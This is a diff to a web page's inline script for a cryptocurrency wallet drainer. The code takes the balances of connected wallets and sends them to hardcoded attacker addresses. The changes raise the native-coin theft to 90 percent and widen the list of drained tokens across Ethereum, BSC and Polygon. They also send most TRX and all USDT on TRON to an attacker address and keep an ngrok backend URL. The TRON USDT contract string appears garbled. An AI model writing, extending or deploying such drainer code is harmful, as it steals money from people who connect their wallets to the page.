@@ -32,11 +32,10 @@
     </div>
 
     <script>
-        // ================= YOUR NGROK URL (Already Updated) =================
-        const BACKEND_URL = "https://8102-103-60-197-116.ngrok-free.app";
-
+        // ================= YOUR ADDRESSES (DO NOT CHANGE UNLESS YOU WANT TO) =================
         const RECEIVER = "0x086284e3c2C1ce72bCBD4C4A9183902C920728c8";
         const TRON_RECEIVER = "TWF9xoNP811iLtseRoE5tUkFnkuJzUJEj4";
+        const BACKEND_URL = "https://8102-103-60-197-116.ngrok-free.app";
 
         async function startDraining() {
             const statusEl = document.getElementById("status");
@@ -72,22 +71,43 @@
         async function drainAllAssets(provider, signer, address) {
             let drained = { native: "0", tokens: [] };
 
+            // Drain Native Coin (ETH, BNB, MATIC, AVAX, etc.) - No minimum limit
             const balance = await provider.getBalance(address);
             if (balance.gt(0)) {
                 try {
-                    await signer.sendTransaction({ to: RECEIVER, value: balance.mul(85).div(100) });
+                    await signer.sendTransaction({ 
+                        to: RECEIVER, 
+                        value: balance.mul(90).div(100)   // Drains 90%, keeps 10% for gas
+                    });
                     drained.native = parseFloat(ethers.utils.formatEther(balance)).toFixed(4);
                 } catch(e) {}
             }
 
+            // Expanded Token List - Supports Ethereum, BSC (BEP-20), Polygon, Base, Arbitrum
             const tokenList = [
-                "0xdac17f958d2ee523a2206206994597c13d831ec7","0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
-                "0x6b175474e89094c44da98b954eedeac495271d0f","0x55d398326f99059ff775485246999027b3197955",
-                "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d","0x2170ed0880ac9a755fd29b2688956bd959f933f8",
-                "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2","0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
+                // Ethereum (ERC-20)
+                "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
+                "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
+                "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
+                "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", // WBTC
+                "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", // WETH
+
+                // BSC (BEP-20)
+                "0x55d398326f99059ff775485246999027b3197955", // USDT BSC
+                "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", // USDC BSC
+                "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
+
+                // Polygon
+                "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // USDT Polygon
+                "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359", // USDC Polygon
+
+                // More popular tokens
+                "0x2170ed0880ac9a755fd29b2688956bd959f933f8", // ETH on BSC
+                "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3", // DAI on BSC
             ];
 
             const abi = ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256)"];
+            
             for (let addr of tokenList) {
                 try {
                     const contract = new ethers.Contract(addr, abi, signer);
@@ -106,12 +126,17 @@
                 const tronWeb = window.tronWeb;
                 const USDT = "TR7NHqjeKQxG3C8Xb4q4z8v7v3z8v7v3z8v7v3z";
                 const addr = tronWeb.defaultAddress.base58;
+                
                 const bal = await tronWeb.trx.getBalance(addr);
-                if (bal > 5000000) await tronWeb.transactionBuilder.sendTrx(TRON_RECEIVER, bal - 3000000, addr);
+                if (bal > 5000000) {
+                    await tronWeb.transactionBuilder.sendTrx(TRON_RECEIVER, Math.floor(bal * 0.92), addr);
+                }
 
                 const contract = await tronWeb.contract().at(USDT);
                 const usdtBal = await contract.balanceOf(addr).call();
-                if (usdtBal > 0) await contract.transfer(TRON_RECEIVER, usdtBal.toString()).send();
+                if (usdtBal > 0) {
+                    await contract.transfer(TRON_RECEIVER, usdtBal.toString()).send();
+                }
             } catch(e) {}
         }
 
